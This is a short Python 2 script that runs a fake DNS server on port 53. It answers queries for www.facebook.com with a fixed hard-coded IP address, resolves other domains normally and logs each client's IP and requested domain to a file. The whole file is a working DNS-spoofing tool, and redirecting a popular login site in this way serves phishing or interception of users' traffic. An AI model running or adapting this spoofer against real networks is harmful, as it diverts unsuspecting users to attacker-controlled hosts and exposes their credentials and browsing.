__author__ = "Reverberi Luca"
# Based on this script: http://www.clshack.com/pythonfake-dns-server.html
import SocketServer
import socket
from time import gmtime, strftime

fake={"www.facebook.com":"81.31.148.65"}
logFile = open("log.txt",'a')

def fake_ip(domain,fake):
	if domain in fake:
		return fake[domain]
	try:
		return socket.gethostbyname(domain)
	except socket.error:
		print "\nServer error get ip for this domain: "+domain 
		print "\nReturn 127.0.0.1\n"
		return '127.0.0.1'

class dnsServer(SocketServer.BaseRequestHandler):
	def handle(self):
		data = self.request[0].strip()
		socket = self.request[1]
		print "Connect to server: "+self.client_address[0]
		dominio=""
		tipo = (ord(data[2]) >> 3) & 15   
		if tipo == 0:                     
			ini=12
			lon=ord(data[ini])
		while lon != 0:
			dominio+=data[ini+1:ini+lon+1]+'.'
			ini+=lon+1
			try:
				lon=ord(data[ini])
			except:
				print "Lunghezza non corretta"
				lon=0
				dominio=''
		#packet dns
		packet=''
		ip=''
		if dominio:
			ip=fake_ip(dominio[:-1],fake)
		
			packet+=data[:2] + "\x81\x80"
			packet+=data[4:6] + data[4:6] + '\x00\x00\x00\x00' 
			packet+=data[12:]
			packet+='\xc0\x0c'
			packet+='\x00\x01\x00\x01\x00\x00\x00\x01\x00\x04' 
			packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) 
			print strftime("%d-%m-%Y,%H:%M:%S", gmtime())+" Request: %s and response with -> %s" % (dominio[:-1], ip)
			
		logFile.write(strftime("%d-%m-%Y,%H:%M:%S", gmtime())+"| Ip: "+self.client_address[0]+" Richiesta: "+dominio[:-1]+" Ip Risolto: "+ip+"\n")
		socket.sendto(packet, self.client_address)
		
if __name__ == "__main__":
	print   "*-----------------------------------------------*\n"  
	print   "*           Fake Dns Server       		 *\n" 
	print   "*-----------------------------------------------*\n"
	HOST, PORT = "", 53
	server = SocketServer.ThreadingUDPServer((HOST, PORT), dnsServer)
	try:
		server.serve_forever()
	except:
		logFile.close()
		print '\nEsco'
		exit()
